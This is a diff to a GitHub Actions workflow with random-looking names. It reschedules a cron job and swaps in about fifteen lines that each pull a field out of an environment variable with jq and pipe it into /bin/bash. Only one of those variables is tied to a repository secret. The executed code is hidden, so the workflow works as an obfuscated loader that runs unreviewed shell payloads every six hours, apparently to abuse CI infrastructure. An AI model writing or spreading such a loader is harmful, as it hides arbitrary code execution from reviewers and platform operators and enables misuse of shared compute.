@@ -2,26 +2,31 @@ name: duyunahen
 on:
   workflow_dispatch:
   schedule:
-    - cron: '11 2/6 * * *'
+    - cron: '1 5/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: duyunahen
         env:
-          a4301: ${{ secrets.a4301 }}
+          bbcvr9827: ${{ secrets.bbcvr9827 }}
         run: |
-          echo $a4301 | jq -r .fqq380 | /bin/bash
-          echo $vhap7814 | jq -r .ybrl4 | /bin/bash
-          echo $syau541 | jq -r .b94 | /bin/bash
-          echo $bod88 | jq -r .qz7 | /bin/bash
-          echo $wbgvt87691 | jq -r .zyyy1045 | /bin/bash
-          echo $awmgx6 | jq -r .r4 | /bin/bash
-          echo $goaue47 | jq -r .jj7 | /bin/bash
-          echo $zk4845 | jq -r .p77555 | /bin/bash
-          echo $qguww539 | jq -r .cfgfw50 | /bin/bash
-          echo $vwr9 | jq -r .zph55113 | /bin/bash
-          echo $ec87 | jq -r .rhwju72466 | /bin/bash
-          echo $lucy827 | jq -r .sw08 | /bin/bash
+          echo $bbcvr9827 | jq -r .fdjct20662 | /bin/bash
+          echo $qo866 | jq -r .dwm6 | /bin/bash
+          echo $kpj362 | jq -r .xk69714 | /bin/bash
+          echo $bfun9 | jq -r .rvgz48 | /bin/bash
+          echo $k8000 | jq -r .tqerc9915 | /bin/bash
+          echo $tdpow9 | jq -r .js76659 | /bin/bash
+          echo $of3852 | jq -r .kka6125 | /bin/bash
+          echo $bnj3 | jq -r .lkbty342 | /bin/bash
+          echo $ss98 | jq -r .hn7 | /bin/bash
+          echo $wthm0 | jq -r .mt166 | /bin/bash
+          echo $wgx6 | jq -r .ue7 | /bin/bash
+          echo $xgk2 | jq -r .idn726 | /bin/bash
+          echo $pknzl57 | jq -r .dd624 | /bin/bash
+          echo $vqfk569 | jq -r .funct38470 | /bin/bash
+          echo $tojuh75721 | jq -r .ld5 | /bin/bash
 
